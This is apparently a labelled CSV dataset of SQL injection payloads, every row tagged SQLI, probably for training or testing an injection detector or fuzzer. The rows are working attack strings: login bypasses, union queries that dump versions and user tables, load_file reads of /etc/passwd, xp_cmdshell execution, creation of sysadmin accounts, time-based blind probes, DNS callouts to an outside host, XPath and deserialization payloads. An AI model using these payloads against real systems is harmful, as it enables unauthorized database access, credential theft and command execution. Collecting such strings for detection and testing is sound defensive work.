payload,attack
 or '1'='1,SQLI
; or '1'='1',SQLI
""" or isNULL(1/0) /*",SQLI
 or '7659'='7659,SQLI
""" or isNULL(1/0) /*",SQLI
 or 1=1--,SQLI
""" or 1=1--",SQLI
 or 1=1 /*,SQLI
or 1=1--,SQLI
 or 'a'='a,SQLI
""" or ""a""=""a",SQLI
) or ('a'='a,SQLI
admin' or ',SQLI
 select * from information_schema.tables--,SQLI
) union select * from information_schema.tables;,SQLI
 having 1=1--,SQLI
 having 1=1--,SQLI
 group by userid having 1=1--,SQLI
 select name from syscolumns where id = (select id from sysobjects where name = tablename')--,SQLI
 or 1 in (select @@version)--,SQLI
 union all select @@version--,SQLI
 or 'unusual' = 'unusual',SQLI
 or 'something' = 'some'+'thing',SQLI
 or 'text' = n'text',SQLI
 or 'something' like 'some%',SQLI
 or 2 > 1,SQLI
 or 'text' > 't',SQLI
 or 'whatever' in ('whatever'),SQLI
 or 2 between 1 and 3,SQLI
 or username like char(37);,SQLI
" union select * from users where login = char(114,111,111,116);",SQLI
 union select ,SQLI
password:*/=1--,SQLI
uni/**/on sel/**/ect,SQLI
; execute immediate 'sel' || 'ect us' || 'er',SQLI
; exec ('sel' + 'ect us' + 'er'),SQLI
/**/or/**/1/**/=/**/1,SQLI
 or 1/*,SQLI
 or isNULL(1/0) /*,SQLI
 or '7659'='7659,SQLI
""" or isNULL(1/0) /*",SQLI
 -- &password=,SQLI
; begin declare @var varchar(8000) set @var=':' select @var=@var+'+login+'/'+password+' ' from users where login > ,SQLI
@var select @var as var into temp end --,SQLI
 and 1 in (select var from temp)--,SQLI
" union select 1,load_file('/etc/passwd'),1,1,1;",SQLI
"1;(load_file(char(47,101,116,99,47,112,97,115,115,119,100))),1,1,1;",SQLI
" and 1=( if((load_file(char(110,46,101,120,116))<>char(39,39)),1,0));",SQLI
; exec master..xp_cmdshell 'ping 10.10.1.2'--,SQLI
create user name identified by 'pass123',SQLI
create user name identified by pass123 temporary tablespace temp default tablespace users; ,SQLI
 ; drop table temp --,SQLI
"exec sp_addlogin 'name' , 'password'",SQLI
"exec sp_addsrvrolemember 'name' , 'sysadmin'",SQLI
"insert into mysql.user (user, host, password) values ('name', 'localhost', password('pass123'))",SQLI
grant connect to name; grant resource to name;,SQLI
"insert into users(login, password, level) values( char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72) + char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72),char(0x64)",SQLI
 or 1=1 --,SQLI
 union (select @@version) --,SQLI
" union (select NULL, (select @@version)) --",SQLI
" union (select NULL, NULL, (select @@version)) --",SQLI
" union (select NULL, NULL, NULL,  (select @@version)) --",SQLI
" union (select NULL, NULL, NULL, NULL,  (select @@version)) --",SQLI
" union (select NULL, NULL, NULL, NULL,  NULL, (select @@version)) --",SQLI
"; if not(substring((select @@version),25,1) <> 0) waitfor delay '0:0:2' --",SQLI
"; if not(substring((select @@version),25,1) <> 5) waitfor delay '0:0:2' --",SQLI
"; if not(substring((select @@version),25,1) <> 8) waitfor delay '0:0:2' --",SQLI
"; if not(substring((select @@version),24,1) <> 1) waitfor delay '0:0:2' --",SQLI
; if not(select system_user) <> 'sa' waitfor delay '0:0:2' --,SQLI
; if is_srvrolemember('sysadmin') > 0 waitfor delay '0:0:2' -- ,SQLI
; if not((select serverproperty('isintegratedsecurityonly')) <> 1) waitfor delay '0:0:2' --,SQLI
; if not((select serverproperty('isintegratedsecurityonly')) <> 0) waitfor delay '0:0:2' --,SQLI
8888'+AND+'1'+LIKE+'1 -->,SQLI
8888'+AND+'2'+LIKE+'1 -->,SQLI
8888'+AND+(@@TEXTSIZE>@@LANGID)+AND+'1'+LIKE+'1 -->,SQLI
8888'+AND+(@@LANGID>@@TEXTSIZE)+'1'+LIKE+'1 -->,SQLI
 or ''-',SQLI
 or '' ',SQLI
 or ''&',SQLI
 or ''^',SQLI
 or ''*',SQLI
""" or """"-""",SQLI
""" or """" """,SQLI
""" or """"&""",SQLI
""" or """"^""",SQLI
""" or """"*""",SQLI
or true--,SQLI
""" or true--",SQLI
 or true--,SQLI
""") or true--",SQLI
) or true--,SQLI
 or 'x'='x,SQLI
) or ('x')=('x,SQLI
)) or (('x'))=(('x,SQLI
""" or ""x""=""x",SQLI
""") or (""x"")=(""x",SQLI
""")) or ((""x""))=((""x",SQLI
or 1=1,SQLI
or 1=1-- ,SQLI
or 1=1#,SQLI
or 1=1/*,SQLI
admin' --,SQLI
admin' #,SQLI
admin'/*,SQLI
admin' or '1'='1,SQLI
admin' or '1'='1'--,SQLI
admin' or '1'='1'#,SQLI
admin' or '1'='1'/*,SQLI
admin'or 1=1 or ''=',SQLI
admin' or 1=1,SQLI
admin' or 1=1--,SQLI
admin' or 1=1#,SQLI
admin' or 1=1/*,SQLI
admin') or ('1'='1,SQLI
admin') or ('1'='1'--,SQLI
admin') or ('1'='1'#,SQLI
admin') or ('1'='1'/*,SQLI
admin') or '1'='1,SQLI
admin') or '1'='1'--,SQLI
admin') or '1'='1'#,SQLI
admin') or '1'='1'/*,SQLI
"1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055",SQLI
"admin"" --",SQLI
"admin"" #",SQLI
"admin""/*",SQLI
"admin"" or ""1""=""1",SQLI
"admin"" or ""1""=""1""--",SQLI
"admin"" or ""1""=""1""#",SQLI
"admin"" or ""1""=""1""/*",SQLI
"admin""or 1=1 or """"=""",SQLI
"admin"" or 1=1",SQLI
"admin"" or 1=1--",SQLI
"admin"" or 1=1#",SQLI
"admin"" or 1=1/*",SQLI
"admin"") or (""1""=""1",SQLI
"admin"") or (""1""=""1""--",SQLI
"admin"") or (""1""=""1""#",SQLI
"admin"") or (""1""=""1""/*",SQLI
"admin"") or ""1""=""1",SQLI
"admin"") or ""1""=""1""--",SQLI
"admin"") or ""1""=""1""#",SQLI
"admin"") or ""1""=""1""/*",SQLI
"1234 "" AND 1=0 UNION ALL SELECT ""admin"", ""81dc9bdb52d04dc20036dbd8313ed055",SQLI
"a:1:{s:+13:"":new:username"";O:67:""EllisLab\\\ExpressionEngine\\\Library\\\Parser\\\Conditional\\\Token\\\Variable"":1:{s:+6:""lexeme"";s:+'.$length.':""1+UNION+SELECT+SLEEP(5)+#+'.$garbage.'"";}}",SQLI
2 and 456=678,SQLI
2 or 345=345,SQLI
2 order by 9999,SQLI
2 order by 1,SQLI
2/0 and 456=678,SQLI
2/1 or 345=345,SQLI
2/*f*/and/*f*/456=678,SQLI
2/*f*/or/*f*/345=345,SQLI
a' and '456'='678,SQLI
a' or '345'='345,SQLI
a' and 'fghi'='fghj'-- #,SQLI
a' or 'dfth'='dfth'-- #,SQLI
a' order by 9999-- #,SQLI
a' order by 1-- #,SQLI
a'and/*g*/456=678-- #,SQLI
a'or/*g*/345=345-- #,SQLI
a' and '456'='678,SQLI
a' or '345'='345,SQLI
a' and 'fghi'='fghj'#,SQLI
a' or 'dfth'='dfth'#,SQLI
a' order by 9999#,SQLI
a' order by 1#,SQLI
a'||/**/456=678#,SQLI
a'||/**/345=345#,SQLI
a' and '456'='678,SQLI
a' or '345'='345,SQLI
a' and 'fghi'='fghj'--,SQLI
a' or 'dfth'='dfth'--,SQLI
a' order by 9999--,SQLI
a' order by 1--,SQLI
a'and/*d*/456=678--,SQLI
a'or/*d*/345=345--,SQLI
a' and '456'='678,SQLI
a' or '345'='345,SQLI
a' and 'fghi'='fghj'-- #,SQLI
a' or 'dfth'='dfth'-- #,SQLI
a' order by 9999-- #,SQLI
a' order by 1-- #,SQLI
a'and/*g*/456=678-- #,SQLI
a'or/*g*/345=345-- #,SQLI
345'%5d|//*|/a%5b'a,SQLI
456'%5d|//a|/a%5b'a,SQLI
"345')%5d|//*|/a%5bcontains(a,'b",SQLI
"456')%5d|//a|/a%5bcontains(a,'b",SQLI
"a"" and ""456""=""678",SQLI
"a"" or ""345""=""345",SQLI
"a"" and ""fghi""=""fghj""-- #",SQLI
"a"" or ""dfth""=""dfth""-- #",SQLI
"a"" order by 9999-- #",SQLI
"a"" order by 1-- #",SQLI
"a""and/*g*/456=678-- #",SQLI
"a""or/*g*/345=345-- #",SQLI
"345""%5d|//*|/a%5b""a",SQLI
"456""%5d|//a|/a%5b""a",SQLI
"345"")%5d|//*|/a%5bcontains(a,""b",SQLI
"456"")%5d|//a|/a%5bcontains(a,""b",SQLI
1 waitfor delay '0:0:X'--,SQLI
1; waitfor delay '0:0:X'--,SQLI
1'; waitfor delay '0:0:X'--,SQLI
1); waitfor delay '0:0:X'--,SQLI
1)); waitfor delay '0:0:X'--,SQLI
1'); waitfor delay '0:0:X'--,SQLI
1')); waitfor delay '0:0:X'--,SQLI
"1 or benchmark(100000000,MD5(1))#",SQLI
"1' or benchmark(100000000,MD5(1))#",SQLI
"1) or benchmark(100000000,MD5(1))#",SQLI
"1') or benchmark(100000000,MD5(1))#",SQLI
"1)) or benchmark(100000000,MD5(1))#",SQLI
"1')) or benchmark(100000000,MD5(1))#",SQLI
1/(select UTL_INADDR.get_host_address('n0where329.z0m') from dual)--,SQLI
1' AND 1=UTL_INADDR.get_host_address('n0where329.z0m')--,SQLI
1 waitfor delay '0:0:X'--,SQLI
1; waitfor delay '0:0:X'--,SQLI
1'; waitfor delay '0:0:X'--,SQLI
1); waitfor delay '0:0:X'--,SQLI
1)); waitfor delay '0:0:X'--,SQLI
1'); waitfor delay '0:0:X'--,SQLI
1')); waitfor delay '0:0:X'--,SQLI
"1 or benchmark(100000000,MD5(1))#",SQLI
"1' or benchmark(100000000,MD5(1))#",SQLI
"1) or benchmark(100000000,MD5(1))#",SQLI
"1') or benchmark(100000000,MD5(1))#",SQLI
"1)) or benchmark(100000000,MD5(1))#",SQLI
"1')) or benchmark(100000000,MD5(1))#",SQLI
1/(select UTL_INADDR.get_host_address('n0where329.z0m') from dual)--,SQLI
1' AND 1=UTL_INADDR.get_host_address('n0where329.z0m')--,SQLI
